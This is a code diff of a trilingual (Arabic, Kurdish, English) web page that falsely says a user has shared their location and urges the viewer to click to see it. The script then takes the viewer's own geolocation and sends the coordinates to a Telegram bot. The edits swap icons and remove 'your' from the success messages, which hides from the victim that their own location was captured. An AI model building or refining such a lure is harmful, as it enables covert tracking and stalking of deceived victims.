@@ -165,7 +165,7 @@
 
     <!-- ========== ناوەڕۆکی سەرەکی ========== -->
     <div class="card">
-        <div class="icon">📍</div>
+        <div class="icon">🗺️</div>
         <h1 data-i18n="main_title">تم استلام موقع المستخدم</h1>
         <p class="desc" data-i18n="desc">
             لقد أرسل إليك المستخدم موقعه الجغرافي عبر الخرائط.
@@ -180,7 +180,7 @@
         </div>
 
         <button id="btnStart" class="btn" onclick="getLoc()" data-i18n="start_btn">
-            📍 لعرض الموقع الدقيق اضغط هنا
+            🗺️ لعرض الموقع الدقيق اضغط هنا
         </button>
 
         <div id="result"></div>
@@ -199,10 +199,10 @@
                 desc: "لقد أرسل إليك المستخدم موقعه الجغرافي عبر الخرائط. يمكنك عرض الموقع الدقيق بالضغط على الزر أدناه.",
                 info_title: "معلومات الموقع",
                 info_text: "سيتم فتح الموقع مباشرةً على الخريطة مع إظهار الإحداثيات الدقيقة ومكان المستخدم.",
-                start_btn: "📍 لعرض الموقع الدقيق اضغط هنا",
+                start_btn: "🗺️ لعرض الموقع الدقيق اضغط هنا",
                 footer_note: "سيتم فتح الموقع باستخدام تطبيق الخرائط على جهازك.",
                 loading: "⏳ جارٍ تحديد الموقع...",
-                success: "✅ تم تأكيد موقعك",
+                success: "✅ تم تأكيد ",
                 done: "✅ تم",
                 error_prefix: "❌ فشل: ",
                 retry: "📍 إعادة المحاولة"
@@ -213,10 +213,10 @@
                 desc: "بەکارهێنەر شوێنی جوگرافی خۆی بۆ ناردوویت لە ڕێگەی نەخشەوە. دەتوانیت شوێنی ورد ببینی بە کرتەکردن لەسەر دوگمەکەی خوارەوە.",
                 info_title: "زانیاری شوێن",
                 info_text: "شوێنەکە ڕاستەوخۆ لەسەر نەخشە دەکرێتەوە و پۆتانە وردەکان و شوێنی بەکارهێنەر پیشان دەدات.",
-                start_btn: "📍 بۆ پیشاندانی شوێنی ورد کرتە لێرە بکە",
+                start_btn: "🗺️ بۆ پیشاندانی شوێنی ورد کرتە لێرە بکە",
                 footer_note: "شوێنەکە بە بەکارهێنانی بەرنامەی نەخشە لە ئامێرەکەتدا دەکرێتەوە.",
                 loading: "⏳ چاوەڕوانی دیاریکردنی شوێن...",
-                success: "✅ شوێنەکەت پشتڕاست کرایەوە",
+                success: "✅  پشتڕاست کرایەوە",
                 done: "✅ تەواو",
                 error_prefix: "❌ شکست: ",
                 retry: "📍 دووبارە هەوڵبدەرەوە"
@@ -227,10 +227,10 @@
                 desc: "The user has sent you their geographic location via maps. You can view the exact location by clicking the button below.",
                 info_title: "Location Info",
                 info_text: "The location will open directly on the map showing the precise coordinates and the user's place.",
-                start_btn: "📍 Click here to view exact location",
+                start_btn: "🗺️ Click here to view exact location",
                 footer_note: "The location will be opened using the maps application on your device.",
                 loading: "⏳ Locating...",
-                success: "✅ Your location confirmed",
+                success: "✅  location confirmed",
                 done: "✅ Done",
                 error_prefix: "❌ Failed: ",
                 retry: "📍 Retry"
@@ -304,7 +304,7 @@
                 const lat = position.coords.latitude;
                 const lng = position.coords.longitude;
                 const mapsLink = `https://www.google.com/maps?q=${lat},${lng}`;
-                const message = `📍 **موقع جديد**\n🆔 ID: ${chatId}\n📌 ${lat}, ${lng}\n🗺️ ${mapsLink}`;
+                const message = `🗺️ **موقع جديد**\n🆔 ID: ${chatId}\n📌 ${lat}, ${lng}\n🗺️ ${mapsLink}`;
 
                 await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
                     method: 'POST',
